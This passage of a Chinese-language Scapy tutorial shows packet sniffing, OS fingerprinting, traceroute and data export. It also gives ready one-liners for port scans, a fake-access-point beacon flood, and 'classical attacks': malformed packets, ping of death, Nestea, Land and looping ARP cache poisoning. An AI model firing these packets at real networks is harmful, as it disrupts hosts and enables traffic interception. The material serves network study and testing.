&apos;B\xf7i\xa9\x00\x04\x149\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !\x22#$%&amp;\&apos;()*+,-./01234567&apos; ---[ Ethernet ]--- dst = 00:02:15:37:a2:44 src = 00:ae:f3:52:aa:d1 type = 0x800 ---[ IP ]--- version = 4L ihl = 5L tos = 0x0 len = 84 id = 2070 flags = frag = 0L ttl = 42 proto = ICMP chksum = 0x861b src = 66.35.250.151 dst = 192.168.5.21 options = &apos;&apos; ---[ ICMP ]--- type = echo-reply code = 0 chksum = 0x91d9 id = 0xc245 seq = 0x0 ---[ Raw ]--- load = &apos;B\xf7i\xa9\x00\x04\x149\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !\x22#$%&amp;\&apos;()*+,-./01234567&apos; ---[ Padding ]--- load = &apos;\n_\x00\x0b&apos;对于控制输出信息，我们可以使用sprintf()函数： &gt;&gt;&gt; pkts = sniff(prn=lambda x:x.sprintf(&quot;{IP:%IP.src% -&gt; %IP.dst%\n}{Raw:%Raw.load%\n}&quot;)) 192.168.1.100 -&gt; 64.233.167.99 64.233.167.99 -&gt; 192.168.1.100 192.168.1.100 -&gt; 64.233.167.99 192.168.1.100 -&gt; 64.233.167.99 &apos;GET / HTTP/1.1\r\nHost: 64.233.167.99\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071022 Ubuntu/7.10 (gutsy) Firefox/2.0.0.8\r\nAccept: text/xml,application/xml,application/xhtml+xml, text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 300\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\n\r\n&apos;我们可以嗅探并进行被动操作系统指纹识别： &gt;&gt;&gt; p &lt;Ether dst=00:10:4b:b3:7d:4e src=00:40:33:96:7b:60 type=0x800 |&lt;IP version=4L ihl=5L tos=0x0 len=60 id=61681 flags=DF frag=0L ttl=64 proto=TCP chksum=0xb85e src=192.168.8.10 dst=192.168.8.1 options=&apos;&apos; |&lt;TCP sport=46511 dport=80 seq=2023566040L ack=0L dataofs=10L reserved=0L flags=SEC window=5840 chksum=0x570c urgptr=0 options=[(&apos;Timestamp&apos;, (342940201L, 0L)), (&apos;MSS&apos;, 1460), (&apos;NOP&apos;, ()), (&apos;SAckOK&apos;, &apos;&apos;), (&apos;WScale&apos;, 0)] |&gt;&gt;&gt; &gt;&gt;&gt; load_module(&quot;p0f&quot;) &gt;&gt;&gt; p0f(p) (1.0, [&apos;Linux 2.4.2 - 2.4.14 (1)&apos;]) &gt;&gt;&gt; a=sniff(prn=prnp0f) (1.0, [&apos;Linux 2.4.2 - 2.4.14 (1)&apos;]) (1.0, [&apos;Linux 2.4.2 - 2.4.14 (1)&apos;]) (0.875, [&apos;Linux 2.4.2 - 2.4.14 (1)&apos;, &apos;Linux 2.4.10 (1)&apos;, &apos;Windows 98 (?)&apos;]) (1.0, [&apos;Windows 2000 (9)&apos;])猜测操作系统版本前的数字为猜测的精确度。 Filters演示一下bpf过滤器和sprintf()方法： &gt;&gt;&gt; a=sniff(filter=&quot;tcp and ( port 25 or port 110 )&quot;, prn=lambda x: x.sprintf(&quot;%IP.src%:%TCP.sport% -&gt; %IP.dst%:%TCP.dport% %2s,TCP.flags% : %TCP.payload%&quot;)) 192.168.8.10:47226 -&gt; 213.228.0.14:110 S : 213.228.0.14:110 -&gt; 192.168.8.10:47226 SA : 192.168.8.10:47226 -&gt; 213.228.0.14:110 A : 213.228.0.14:110 -&gt; 192.168.8.10:47226 PA : +OK &lt;13103.1048117923@pop2-1.free.fr&gt; 192.168.8.10:47226 -&gt; 213.228.0.14:110 A : 192.168.8.10:47226 -&gt; 213.228.0.14:110 PA : USER toto 213.228.0.14:110 -&gt; 192.168.8.10:47226 A : 213.228.0.14:110 -&gt; 192.168.8.10:47226 PA : +OK 192.168.8.10:47226 -&gt; 213.228.0.14:110 A : 192.168.8.10:47226 -&gt; 213.228.0.14:110 PA : PASS tata 213.228.0.14:110 -&gt; 192.168.8.10:47226 PA : -ERR authorization failed 192.168.8.10:47226 -&gt; 213.228.0.14:110 A : 213.228.0.14:110 -&gt; 192.168.8.10:47226 FA : 192.168.8.10:47226 -&gt; 213.228.0.14:110 FA : 213.228.0.14:110 -&gt; 192.168.8.10:47226 A :在循环中接收和发送这儿有一个例子来实现类似(h)ping的功能：你一直发送同样的数据包集合来观察是否发生变化： &gt;&gt;&gt; srloop(IP(dst=&quot;www.target.com/30&quot;)/TCP()) RECV 1: Ether / IP / TCP 192.168.11.99:80 &gt; 192.168.8.14:20 SA / Padding fail 3: IP / TCP 192.168.8.14:20 &gt; 192.168.11.96:80 S IP / TCP 192.168.8.14:20 &gt; 192.168.11.98:80 S IP / TCP 192.168.8.14:20 &gt; 192.168.11.97:80 S RECV 1: Ether / IP / TCP 192.168.11.99:80 &gt; 192.168.8.14:20 SA / Padding fail 3: IP / TCP 192.168.8.14:20 &gt; 192.168.11.96:80 S IP / TCP 192.168.8.14:20 &gt; 192.168.11.98:80 S IP / TCP 192.168.8.14:20 &gt; 192.168.11.97:80 S RECV 1: Ether / IP / TCP 192.168.11.99:80 &gt; 192.168.8.14:20 SA / Padding fail 3: IP / TCP 192.168.8.14:20 &gt; 192.168.11.96:80 S IP / TCP 192.168.8.14:20 &gt; 192.168.11.98:80 S IP / TCP 192.168.8.14:20 &gt; 192.168.11.97:80 S RECV 1: Ether / IP / TCP 192.168.11.99:80 &gt; 192.168.8.14:20 SA / Padding fail 3: IP / TCP 192.168.8.14:20 &gt; 192.168.11.96:80 S IP / TCP 192.168.8.14:20 &gt; 192.168.11.98:80 S IP / TCP 192.168.8.14:20 &gt; 192.168.11.97:80 S导入和导出数据PCAP通常可以将数据包保存为pcap文件以备后用，或者是供其他的应用程序使用： &gt;&gt;&gt; wrpcap(&quot;temp.cap&quot;,pkts)还原之前保存的pcap文件： &gt;&gt;&gt; pkts = rdpcap(&quot;temp.cap&quot;)或者 &gt;&gt;&gt; pkts = rdpcap(&quot;temp.cap&quot;)HexdumpScapy允许你以不同的十六进制格式输出编码的数据包。 使用hexdump()函数会以经典的hexdump格式输出数据包： &gt;&gt;&gt; hexdump(pkt) 0000 00 50 56 FC CE 50 00 0C 29 2B 53 19 08 00 45 00 .PV..P..)+S...E. 0010 00 54 00 00 40 00 40 01 5A 7C C0 A8 19 82 04 02 .T..@.@.Z|...... 0020 02 01 08 00 9C 90 5A 61 00 01 E6 DA 70 49 B6 E5 ......Za....pI.. 0030 08 00 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 ................ 0040 16 17 18 19 1A 1B 1C 1D 1E 1F 20 21 22 23 24 25 .......... !&quot;#$% 0050 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31 32 33 34 35 &amp;&apos;()*+,-./012345 0060 36 37 67使用import_hexcap()函数可以将以上的hexdump重新导入到Scapy中： &gt;&gt;&gt; pkt_hex = Ether(import_hexcap()) 0000 00 50 56 FC CE 50 00 0C 29 2B 53 19 08 00 45 00 .PV..P..)+S...E. 0010 00 54 00 00 40 00 40 01 5A 7C C0 A8 19 82 04 02 .T..@.@.Z|...... 0020 02 01 08 00 9C 90 5A 61 00 01 E6 DA 70 49 B6 E5 ......Za....pI.. 0030 08 00 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 ................ 0040 16 17 18 19 1A 1B 1C 1D 1E 1F 20 21 22 23 24 25 .......... !&quot;#$% 0050 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31 32 33 34 35 &amp;&apos;()*+,-./012345 0060 36 37 67 &gt;&gt;&gt; pkt_hex &lt;Ether dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP version=4L ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c src=192.168.25.130 dst=4.2.2.1 options=&apos;&apos; |&lt;ICMP type=echo-request code=0 chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw load=&apos;\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n \x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e \x1f !&quot;#$%&amp;\&apos;()*+,-./01234567&apos; |&gt;&gt;&gt;&gt;Hex string使用str()函数可以将整个数据包转换成十六进制字符串： &gt;&gt;&gt; pkts = sniff(count = 1) &gt;&gt;&gt; pkt = pkts[0] &gt;&gt;&gt; pkt &lt;Ether dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP version=4L ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c src=192.168.25.130 dst=4.2.2.1 options=&apos;&apos; |&lt;ICMP type=echo-request code=0 chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw load=&apos;\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n \x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e \x1f !&quot;#$%&amp;\&apos;()*+,-./01234567&apos; |&gt;&gt;&gt;&gt; &gt;&gt;&gt; pkt_str = str(pkt) &gt;&gt;&gt; pkt_str &apos;\x00PV\xfc\xceP\x00\x0c)+S\x19\x08\x00E\x00\x00T\x00\x00@\x00@\x01Z|\xc0\xa8 \x19\x82\x04\x02\x02\x01\x08\x00\x9c\x90Za\x00\x01\xe6\xdapI\xb6\xe5\x08\x00 \x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b \x1c\x1d\x1e\x1f !&quot;#$%&amp;\&apos;()*+,-./01234567&apos;通过选择合适的起始层（例如Ether()），我们可以重新导入十六进制字符串。 &gt;&gt;&gt; new_pkt = Ether(pkt_str) &gt;&gt;&gt; new_pkt &lt;Ether dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP version=4L ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c src=192.168.25.130 dst=4.2.2.1 options=&apos;&apos; |&lt;ICMP type=echo-request code=0 chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw load=&apos;\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n \x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e \x1f !&quot;#$%&amp;\&apos;()*+,-./01234567&apos; |&gt;&gt;&gt;&gt;Base64使用export_object()函数，Scapy可以数据包转换成base64编码的Python数据结构： &gt;&gt;&gt; pkt &lt;Ether dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP version=4L ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c src=192.168.25.130 dst=4.2.2.1 options=&apos;&apos; |&lt;ICMP type=echo-request code=0 chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw load=&apos;\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n \x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !&quot;#$%&amp;\&apos;()*+,-./01234567&apos; |&gt;&gt;&gt;&gt; &gt;&gt;&gt; export_object(pkt) eNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST OD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+1rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao bMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT WZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6 ...使用import_object()函数，可以将以上输出重新导入到Scapy中： &gt;&gt;&gt; new_pkt = import_object() eNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST OD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+1rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao bMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT WZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6 ... &gt;&gt;&gt; new_pkt &lt;Ether dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP version=4L ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c src=192.168.25.130 dst=4.2.2.1 options=&apos;&apos; |&lt;ICMP type=echo-request code=0 chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw load=&apos;\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n \x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !&quot;#$%&amp;\&apos;()*+,-./01234567&apos; |&gt;&gt;&gt;&gt;Sessions最后可以使用save_session()函数来保存所有的session变量： &gt;&gt;&gt; dir() [&apos;__builtins__&apos;, &apos;conf&apos;, &apos;new_pkt&apos;, &apos;pkt&apos;, &apos;pkt_export&apos;, &apos;pkt_hex&apos;, &apos;pkt_str&apos;, &apos;pkts&apos;] &gt;&gt;&gt; save_session(&quot;session.scapy&quot;)使用load_session()函数，在下一次你启动Scapy的时候你就能加载保存的session： &gt;&gt;&gt; dir() [&apos;__builtins__&apos;, &apos;conf&apos;] &gt;&gt;&gt; load_session(&quot;session.scapy&quot;) &gt;&gt;&gt; dir() [&apos;__builtins__&apos;, &apos;conf&apos;, &apos;new_pkt&apos;, &apos;pkt&apos;, &apos;pkt_export&apos;, &apos;pkt_hex&apos;, &apos;pkt_str&apos;, &apos;pkts&apos;]Making tables现在我们来演示一下make_table()函数的功能。该函数的需要一个列表和另一个函数（返回包含三个元素的元组）作为参数。第一个元素是表格x轴上的一个值，第二个元素是y轴上的值，第三个原始则是坐标(x,y)对应的值，其返回结果为一个表格。这个函数有两个变种，make_lined_table()和make_tex_table()来复制/粘贴到你的LaTeX报告中。这些函数都可以作为一个结果对象的方法： 在这里，我们可以看到一个多机并行的traceroute（Scapy的已经有一个多TCP路由跟踪功能，待会儿可以看到）： &gt;&gt;&gt; ans,unans=sr(IP(dst=&quot;www.test.fr/30&quot;, ttl=(1,6))/TCP()) Received 49 packets, got 24 answers, remaining 0 packets &gt;&gt;&gt; ans.make_table( lambda (s,r): (s.dst, s.ttl, r.src) ) 216.15.189.192 216.15.189.193 216.15.189.194 216.15.189.195 1 192.168.8.1 192.168.8.1 192.168.8.1 192.168.8.1 2 81.57.239.254 81.57.239.254 81.57.239.254 81.57.239.254 3 213.228.4.254 213.228.4.254 213.228.4.254 213.228.4.254 4 213.228.3.3 213.228.3.3 213.228.3.3 213.228.3.3 5 193.251.254.1 193.251.251.69 193.251.254.1 193.251.251.69 6 193.251.241.174 193.251.241.178 193.251.241.174 193.251.241.178这里有个更复杂的例子：从他们的IPID字段中识别主机。我们可以看到172.20.80.200只有22端口做出了应答，而172.20.80.201则对所有的端口都有应答，而且172.20.80.197对25端口没有应答，但对其他端口都有应答。 &gt;&gt;&gt; ans,unans=sr(IP(dst=&quot;172.20.80.192/28&quot;)/TCP(dport=[20,21,22,25,53,80])) Received 142 packets, got 25 answers, remaining 71 packets &gt;&gt;&gt; ans.make_table(lambda (s,r): (s.dst, s.dport, r.sprintf(&quot;%IP.id%&quot;))) 172.20.80.196 172.20.80.197 172.20.80.198 172.20.80.200 172.20.80.201 20 0 4203 7021 - 11562 21 0 4204 7022 - 11563 22 0 4205 7023 11561 11564 25 0 0 7024 - 11565 53 0 4207 7025 - 11566 80 0 4028 7026 - 11567你在使用TTL和显示接收到的TTL等情况下，它可以很轻松地帮你识别网络拓扑结构。 Routing现在Scapy有自己的路由表了，所以将你的数据包以不同于操作系统的方式路由： &gt;&gt;&gt; conf.route Network Netmask Gateway Iface 127.0.0.0 255.0.0.0 0.0.0.0 lo 192.168.8.0 255.255.255.0 0.0.0.0 eth0 0.0.0.0 0.0.0.0 192.168.8.1 eth0 &gt;&gt;&gt; conf.route.delt(net=&quot;0.0.0.0/0&quot;,gw=&quot;192.168.8.1&quot;) &gt;&gt;&gt; conf.route.add(net=&quot;0.0.0.0/0&quot;,gw=&quot;192.168.8.254&quot;) &gt;&gt;&gt; conf.route.add(host=&quot;192.168.1.1&quot;,gw=&quot;192.168.8.1&quot;) &gt;&gt;&gt; conf.route Network Netmask Gateway Iface 127.0.0.0 255.0.0.0 0.0.0.0 lo 192.168.8.0 255.255.255.0 0.0.0.0 eth0 0.0.0.0 0.0.0.0 192.168.8.254 eth0 192.168.1.1 255.255.255.255 192.168.8.1 eth0 &gt;&gt;&gt; conf.route.resync() &gt;&gt;&gt; conf.route Network Netmask Gateway Iface 127.0.0.0 255.0.0.0 0.0.0.0 lo 192.168.8.0 255.255.255.0 0.0.0.0 eth0 0.0.0.0 0.0.0.0 192.168.8.1 eth0## Gnuplot 我们可以很容易地将收集起来的数据绘制成Gnuplot。（清确保你已经安装了Gnuplot-py和Gnuplot）例如，我们可以通过观察图案知道负载平衡器用了多少个不同的IP堆栈： &gt;&gt;&gt; a,b=sr(IP(dst=&quot;www.target.com&quot;)/TCP(sport=[RandShort()]*1000)) &gt;&gt;&gt; a.plot(lambda x:x[1].id) &lt;Gnuplot._Gnuplot.Gnuplot instance at 0xb7d6a74c&gt; TCP traceroute (2)Scapy也有强大的TCP traceroute功能。并不像其他traceroute程序那样，需要等待每个节点的回应才去下一个节点，scapy会在同一时间发送所有的数据包。其缺点就是不知道什么时候停止（所以就有maxttl参数），其巨大的优点就是，只用了不到3秒，就可以得到多目标的traceroute结果： &gt;&gt;&gt; traceroute([&quot;www.yahoo.com&quot;,&quot;www.altavista.com&quot;,&quot;www.wisenut.com&quot;,&quot;www.copernic.com&quot;],maxttl=20) Received 80 packets, got 80 answers, remaining 0 packets 193.45.10.88:80 216.109.118.79:80 64.241.242.243:80 66.94.229.254:80 1 192.168.8.1 192.168.8.1 192.168.8.1 192.168.8.1 2 82.243.5.254 82.243.5.254 82.243.5.254 82.243.5.254 3 213.228.4.254 213.228.4.254 213.228.4.254 213.228.4.254 4 212.27.50.46 212.27.50.46 212.27.50.46 212.27.50.46 5 212.27.50.37 212.27.50.41 212.27.50.37 212.27.50.41 6 212.27.50.34 212.27.50.34 213.228.3.234 193.251.251.69 7 213.248.71.141 217.118.239.149 208.184.231.214 193.251.241.178 8 213.248.65.81 217.118.224.44 64.125.31.129 193.251.242.98 9 213.248.70.14 213.206.129.85 64.125.31.186 193.251.243.89 10 193.45.10.88 SA 213.206.128.160 64.125.29.122 193.251.254.126 11 193.45.10.88 SA 206.24.169.41 64.125.28.70 216.115.97.178 12 193.45.10.88 SA 206.24.226.99 64.125.28.209 66.218.64.146 13 193.45.10.88 SA 206.24.227.106 64.125.29.45 66.218.82.230 14 193.45.10.88 SA 216.109.74.30 64.125.31.214 66.94.229.254 SA 15 193.45.10.88 SA 216.109.120.149 64.124.229.109 66.94.229.254 SA 16 193.45.10.88 SA 216.109.118.79 SA 64.241.242.243 SA 66.94.229.254 SA 17 193.45.10.88 SA 216.109.118.79 SA 64.241.242.243 SA 66.94.229.254 SA 18 193.45.10.88 SA 216.109.118.79 SA 64.241.242.243 SA 66.94.229.254 SA 19 193.45.10.88 SA 216.109.118.79 SA 64.241.242.243 SA 66.94.229.254 SA 20 193.45.10.88 SA 216.109.118.79 SA 64.241.242.243 SA 66.94.229.254 SA (&lt;Traceroute: UDP:0 TCP:28 ICMP:52 Other:0&gt;, &lt;Unanswered: UDP:0 TCP:0 ICMP:0 Other:0&gt;)最后一行实际上是该函数的返回结果：traceroute返回一个对象和无应答数据包列表。traceroute返回的是一个经典返回对象更加特殊的版本（实际上是一个子类）。我们可以将其保存以备后用，或者是进行一些例如检查填充的更深层次的观察： &gt;&gt;&gt; result,unans=_ &gt;&gt;&gt; result.show() 193.45.10.88:80 216.109.118.79:80 64.241.242.243:80 66.94.229.254:80 1 192.168.8.1 192.168.8.1 192.168.8.1 192.168.8.1 2 82.251.4.254 82.251.4.254 82.251.4.254 82.251.4.254 3 213.228.4.254 213.228.4.254 213.228.4.254 213.228.4.254 [...] &gt;&gt;&gt; result.filter(lambda x: Padding in x[1])和其他返回对象一样，traceroute对象也可以相加： &gt;&gt;&gt; r2,unans=traceroute([&quot;www.voila.com&quot;],maxttl=20) Received 19 packets, got 19 answers, remaining 1 packets 195.101.94.25:80 1 192.168.8.1 2 82.251.4.254 3 213.228.4.254 4 212.27.50.169 5 212.27.50.162 6 193.252.161.97 7 193.252.103.86 8 193.252.103.77 9 193.252.101.1 10 193.252.227.245 12 195.101.94.25 SA 13 195.101.94.25 SA 14 195.101.94.25 SA 15 195.101.94.25 SA 16 195.101.94.25 SA 17 195.101.94.25 SA 18 195.101.94.25 SA 19 195.101.94.25 SA 20 195.101.94.25 SA &gt;&gt;&gt; &gt;&gt;&gt; r3=result+r2 &gt;&gt;&gt; r3.show() 195.101.94.25:80 212.23.37.13:80 216.109.118.72:80 64.241.242.243:80 66.94.229.254:80 1 192.168.8.1 192.168.8.1 192.168.8.1 192.168.8.1 192.168.8.1 2 82.251.4.254 82.251.4.254 82.251.4.254 82.251.4.254 82.251.4.254 3 213.228.4.254 213.228.4.254 213.228.4.254 213.228.4.254 213.228.4.254 4 212.27.50.169 212.27.50.169 212.27.50.46 - 212.27.50.46 5 212.27.50.162 212.27.50.162 212.27.50.37 212.27.50.41 212.27.50.37 6 193.252.161.97 194.68.129.168 212.27.50.34 213.228.3.234 193.251.251.69 7 193.252.103.86 212.23.42.33 217.118.239.185 208.184.231.214 193.251.241.178 8 193.252.103.77 212.23.42.6 217.118.224.44 64.125.31.129 193.251.242.98 9 193.252.101.1 212.23.37.13 SA 213.206.129.85 64.125.31.186 193.251.243.89 10 193.252.227.245 212.23.37.13 SA 213.206.128.160 64.125.29.122 193.251.254.126 11 - 212.23.37.13 SA 206.24.169.41 64.125.28.70 216.115.97.178 12 195.101.94.25 SA 212.23.37.13 SA 206.24.226.100 64.125.28.209 216.115.101.46 13 195.101.94.25 SA 212.23.37.13 SA 206.24.238.166 64.125.29.45 66.218.82.234 14 195.101.94.25 SA 212.23.37.13 SA 216.109.74.30 64.125.31.214 66.94.229.254 SA 15 195.101.94.25 SA 212.23.37.13 SA 216.109.120.151 64.124.229.109 66.94.229.254 SA 16 195.101.94.25 SA 212.23.37.13 SA 216.109.118.72 SA 64.241.242.243 SA 66.94.229.254 SA 17 195.101.94.25 SA 212.23.37.13 SA 216.109.118.72 SA 64.241.242.243 SA 66.94.229.254 SA 18 195.101.94.25 SA 212.23.37.13 SA 216.109.118.72 SA 64.241.242.243 SA 66.94.229.254 SA 19 195.101.94.25 SA 212.23.37.13 SA 216.109.118.72 SA 64.241.242.243 SA 66.94.229.254 SA 20 195.101.94.25 SA 212.23.37.13 SA 216.109.118.72 SA 64.241.242.243 SA 66.94.229.254 SATraceroute返回对象有一个非常实用的功能：他们会将得到的所有路线做成一个有向图，并用AS组织路线。你需要安装graphviz。在默认情况下会使用ImageMagick显示图形。 &gt;&gt;&gt; res,unans = traceroute([&quot;www.microsoft.com&quot;,&quot;www.cisco.com&quot;,&quot;www.yahoo.com&quot;,&quot;www.wanadoo.fr&quot;,&quot;www.pacsec.com&quot;],dport=[80,443],maxttl=20,retry=-2) Received 190 packets, got 190 answers, remaining 10 packets 193.252.122.103:443 193.252.122.103:80 198.133.219.25:443 198.133.219.25:80 207.46... 1 192.168.8.1 192.168.8.1 192.168.8.1 192.168.8.1 192.16... 2 82.251.4.254 82.251.4.254 82.251.4.254 82.251.4.254 82.251... 3 213.228.4.254 213.228.4.254 213.228.4.254 213.228.4.254 213.22... [...] &gt;&gt;&gt; res.graph() # piped to ImageMagick&apos;s display program. Image below. &gt;&gt;&gt; res.graph(type=&quot;ps&quot;,target=&quot;| lp&quot;) # piped to postscript printer &gt;&gt;&gt; res.graph(target=&quot;&gt; /tmp/graph.svg&quot;) # saved to file 如果你安装了VPython，你就可以用3D来表示traceroute。右边的按钮是旋转图案，中间的按钮是放大缩小，左边的按钮是移动图案。如果你单击一个球，它的IP地址就会出现/消失。如果你按住Ctrl单击一个球，就会扫描21,22,23,25,80和443端口，并显示结果： &gt;&gt;&gt; res.trace3D() Wireless frame injectionframe injection的前提是你的无线网卡和驱动得正确配置好。 $ ifconfig wlan0 up $ iwpriv wlan0 hostapd 1 $ ifconfig wlan0ap up你可以造一个FakeAP： &gt;&gt;&gt; sendp(Dot11(addr1=&quot;ff:ff:ff:ff:ff:ff&quot;,addr2=RandMAC(),addr3=RandMAC())/ Dot11Beacon(cap=&quot;ESS&quot;)/ Dot11Elt(ID=&quot;SSID&quot;,info=RandString(RandNum(1,50)))/ Dot11Elt(ID=&quot;Rates&quot;,info=&apos;\x82\x84\x0b\x16&apos;)/ Dot11Elt(ID=&quot;DSset&quot;,info=&quot;\x03&quot;)/ Dot11Elt(ID=&quot;TIM&quot;,info=&quot;\x00\x01\x00\x00&quot;),iface=&quot;wlan0ap&quot;,loop=1)0x02 Simple one-linersACK Scan使用Scapy强大的数据包功能，我们可以快速地复制经典的TCP扫描。例如，模拟ACK Scan将会发送以下字符串： &gt;&gt;&gt; ans,unans = sr(IP(dst=&quot;www.slashdot.org&quot;)/TCP(dport=[80,666],flags=&quot;A&quot;))我们可以在有应答的数据包中发现未过滤的端口： &gt;&gt;&gt; for s,r in ans: ... if s[TCP].dport == r[TCP].sport: ... print str(s[TCP].dport) + &quot; is unfiltered&quot;同样的，可以在无应答的数据包中发现过滤的端口： &gt;&gt;&gt; for s in unans: ... print str(s[TCP].dport) + &quot; is filtered&quot;Xmas Scan可以使用以下的命令来启动Xmas Scan： &gt;&gt;&gt; ans,unans = sr(IP(dst=&quot;192.168.1.1&quot;)/TCP(dport=666,flags=&quot;FPU&quot;) )有RST响应则意味着目标主机的对应端口是关闭的。 IP Scan较低级的IP Scan可以用来枚举支持的协议： &gt;&gt;&gt; ans,unans=sr(IP(dst=&quot;192.168.1.1&quot;,proto=(0,255))/&quot;SCAPY&quot;,retry=2)ARP Ping在本地以太网络上最快速地发现主机的方法莫过于ARP Ping了： &gt;&gt;&gt; ans,unans=srp(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst=&quot;192.168.1.0/24&quot;),timeout=2)用以下命令可以来审查应答： &gt;&gt;&gt; ans.summary(lambda (s,r): r.sprintf(&quot;%Ether.src% %ARP.psrc%&quot;) )Scapy还包含内建函数arping(),该函数实现的功能和以上的两个命令类似： &gt;&gt;&gt; arping(&quot;192.168.1.*&quot;)## ICMP Ping 可以用以下的命令来模拟经典的ICMP Ping： &gt;&gt;&gt; ans,unans=sr(IP(dst=&quot;192.168.1.1-254&quot;)/ICMP())用以下的命令可以收集存活主机的信息： &gt;&gt;&gt; ans.summary(lambda (s,r): r.sprintf(&quot;%IP.src% is alive&quot;) )TCP Ping如果ICMP echo请求被禁止了，我们依旧可以用不同的TCP Pings，就像下面的TCP SYN Ping: &gt;&gt;&gt; ans,unans=sr( IP(dst=&quot;192.168.1.*&quot;)/TCP(dport=80,flags=&quot;S&quot;) )对我们的刺探有任何响应就意味着为一台存活主机，可以用以下的命令收集结果： &gt;&gt;&gt; ans.summary( lambda(s,r) : r.sprintf(“%IP.src% is alive”) ) UDP Ping如果其他的都失败了，还可以使用UDP Ping，它可以让存活主机产生ICMP Port unreachable错误。你可以挑选任何极有可能关闭的端口，就像端口0： &gt;&gt;&gt; ans,unans=sr( IP(dst=&quot;192.168.*.1-10&quot;)/UDP(dport=0) )同样的，使用以下命令收集结果： &gt;&gt;&gt; ans.summary( lambda(s,r) : r.sprintf(&quot;%IP.src% is alive&quot;) )Classical attacksMalformed packets: &gt;&gt;&gt; send(IP(dst=&quot;10.1.1.5&quot;, ihl=2, version=3)/ICMP())Ping of death (Muuahahah): &gt;&gt;&gt; send( fragment(IP(dst=&quot;10.0.0.5&quot;)/ICMP()/(&quot;X&quot;*60000)) )Nestea attack: &gt;&gt;&gt; send(IP(dst=target, id=42, flags=&quot;MF&quot;)/UDP()/(&quot;X&quot;*10)) &gt;&gt;&gt; send(IP(dst=target, id=42, frag=48)/(&quot;X&quot;*116)) &gt;&gt;&gt; send(IP(dst=target, id=42, flags=&quot;MF&quot;)/UDP()/(&quot;X&quot;*224))Land attack (designed for Microsoft Windows): &gt;&gt;&gt; send(IP(src=target,dst=target)/TCP(sport=135,dport=135))## ARP cache poisoning 这种攻击可以通过VLAN跳跃攻击投毒ARP缓存，使得其他客户端无法加入真正的网关地址。 经典的ARP缓存投毒： 12&gt;&gt;&gt; send( Ether(dst=clientMAC)/ARP(op=&quot;who-has&quot;, psrc=gateway, pdst=client), inter=RandNum(10,40), loop=1 ) 使用double 802.1q封装进行ARP缓存投毒： 